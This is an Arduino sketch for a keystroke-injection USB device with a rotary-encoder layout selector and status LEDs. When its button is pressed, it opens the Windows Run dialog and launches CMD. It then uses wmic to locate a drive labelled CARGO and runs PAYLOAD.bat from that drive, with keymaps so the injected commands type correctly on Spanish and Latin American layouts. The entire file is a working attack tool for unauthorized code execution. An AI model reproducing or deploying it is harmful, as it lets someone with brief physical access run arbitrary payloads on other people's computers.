#include <Keyboard.h>

#define LED_EN 9
#define LED_ES 8
#define LED_LA 6
#define ENCODER_OUT_B 2
#define ENCODER_OUT_A 3
#define ENCODER_BUTTON 4

int COUNTER = 0;
int FCOUNTER;
int ENCODER_SENS = 5;
int OUT_A_STATE;
int OUT_A_LAST_STATE;
bool BUTTON;

void setup() {
  pinMode(LED_EN, OUTPUT);
  pinMode(LED_ES, OUTPUT);
  pinMode(LED_LA, OUTPUT);
  pinMode (ENCODER_OUT_A,INPUT);
  pinMode (ENCODER_OUT_B,INPUT);
  pinMode (ENCODER_BUTTON, INPUT_PULLUP);

  Serial.begin (9600);
  Keyboard.begin();

  digitalWrite(LED_EN, HIGH);
  digitalWrite(LED_ES, HIGH);
  digitalWrite(LED_LA, HIGH);

  OUT_A_LAST_STATE = digitalRead(ENCODER_OUT_A);

}

void loop() {
  OUT_A_STATE = digitalRead(ENCODER_OUT_A);
  BUTTON = digitalRead(ENCODER_BUTTON);

  if (OUT_A_STATE != OUT_A_LAST_STATE) {
    if (digitalRead(ENCODER_OUT_B) != OUT_A_STATE) { COUNTER--; }
    else { COUNTER++; }
    
    if (COUNTER > (3*ENCODER_SENS)+ENCODER_SENS) { COUNTER = (1*ENCODER_SENS)-ENCODER_SENS; }
    if (COUNTER < (1*ENCODER_SENS)-ENCODER_SENS) { COUNTER = (3*ENCODER_SENS)+ENCODER_SENS; }

    FCOUNTER = COUNTER/ENCODER_SENS;

    if (FCOUNTER == 1) { 
      digitalWrite(LED_EN, LOW); 
      digitalWrite(LED_ES, HIGH); 
      digitalWrite(LED_LA, HIGH); }
    if (FCOUNTER == 2) { 
      digitalWrite(LED_EN, HIGH); 
      digitalWrite(LED_ES, LOW); 
      digitalWrite(LED_LA, HIGH); }
    if (FCOUNTER == 3) { 
      digitalWrite(LED_EN, HIGH); 
      digitalWrite(LED_ES, HIGH); 
      digitalWrite(LED_LA, LOW); }

  }
  OUT_A_LAST_STATE = OUT_A_STATE;

  if (!BUTTON) { 
    if (FCOUNTER == 1) { EXECUTE(1); while(1) { ANIMATION(1, 1); } }
    if (FCOUNTER == 2) { EXECUTE(2); while(1) { ANIMATION(1, 1); } }
    if (FCOUNTER == 3) { EXECUTE(3); while(1) { ANIMATION(1, 1); } }


  }

}

void EXECUTE(int LANG) {
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); Keyboard.releaseAll(); delay(1000);
  Keyboard.println("CMD"); delay(200);
  Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(1500);
  ANIMATION(0, 1);

  if (LANG == 1) {
    Keyboard.println("for /f %D in ('wmic volume get DriveLetter^, Label ^| find \"CARGO\"') do set usb=%D"); delay(1000);
    Keyboard.println("%usb%/PAYLOAD.bat"); delay(1000); 
    ANIMATION(0, 1);
  }
  if (LANG == 2) {
    ES_KEYBOARD_PRINTLN("for /f %D in ('wmic volume get DriveLetter^, Label ^| find \"CARGO\"') do set usb=%D"); delay(1000);
    ES_KEYBOARD_PRINTLN("%usb%/PAYLOAD.bat"); delay(1000);
    ANIMATION(0, 1);
  }
  if (LANG == 3) {
    LA_KEYBOARD_PRINTLN("for /f %D in ('wmic volume get DriveLetter^, Label ^| find \"CARGO\"') do set usb=%D"); delay(1000);
    LA_KEYBOARD_PRINTLN("%usb%/PAYLOAD.bat"); delay(1000);
    ANIMATION(0, 1);

  }
  Keyboard.press(KEY_LEFT_ARROW); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN);
  ANIMATION(0, 2);

}

void LA_KEYBOARD_PRINTLN(String TEXT) {
  for (int I=0; I<TEXT.length(); I++) {
    char CTR = TEXT[I];

    switch(CTR) {
      case '/': Keyboard.write(38); break;
      case '(': Keyboard.write(42); break;
      case '{': Keyboard.write(39); break;
      case '^': Keyboard.press(KEY_RIGHT_ALT); Keyboard.write(39); Keyboard.releaseAll(); break;
      case '\'': Keyboard.write(45); break;
      case '.': Keyboard.write(46); break;
      case '|': Keyboard.write(96); break;
      case '"': Keyboard.write(64); break;
      case ')': Keyboard.write(40); break;
      case '=': Keyboard.write(41); break;
      default: Keyboard.write(CTR); break;

    }

  }
  Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN);

}

void ES_KEYBOARD_PRINTLN(String TEXT) {
  for (int I=0; I<TEXT.length(); I++) {
    char CTR = TEXT[I];

    switch(CTR) {
      case '/': Keyboard.write(38); break;
      case '(': Keyboard.write(42); break;
      case '{': Keyboard.press(KEY_RIGHT_ALT); Keyboard.write(39); Keyboard.releaseAll(); break;
      case '^': Keyboard.write(123); break;
      case '\'': Keyboard.write(45); break;
      case '.': Keyboard.write(46); break;
      case '|': Keyboard.press(KEY_RIGHT_ALT); Keyboard.write(49); Keyboard.releaseAll(); break;
      case '"': Keyboard.write(64); break;
      case ')': Keyboard.write(40); break;
      case '=': Keyboard.write(41); break;
      default: Keyboard.write(CTR); break;

    }

  }
  Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN);

}

void ANIMATION(int TYPE, int REP) {
  digitalWrite(LED_EN, HIGH);
  digitalWrite(LED_ES, HIGH);
  digitalWrite(LED_LA, HIGH);
  
  for (int R=0; R<REP; R++) {
    if (TYPE == 0) {
      digitalWrite(LED_EN, LOW); delay(100);
      digitalWrite(LED_ES, LOW); delay(100);
      digitalWrite(LED_LA, LOW); delay(100);
      digitalWrite(LED_EN, HIGH); delay(100);
      digitalWrite(LED_ES, HIGH); delay(100);
      digitalWrite(LED_LA, HIGH); delay(100);

    }

    if (TYPE == 1) {
      digitalWrite(LED_EN, LOW); digitalWrite(LED_ES, LOW); digitalWrite(LED_LA, LOW); 
      delay(1000);
      digitalWrite(LED_EN, HIGH); digitalWrite(LED_ES, HIGH); digitalWrite(LED_LA, HIGH); 
      delay(1000);

    }

  }

}

void TEST_VALUES() {

  for (int I=32; I<180; I++) {
    Keyboard.print(I); Keyboard.print(" ");
    Keyboard.write(I);
    Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN);

  }

}

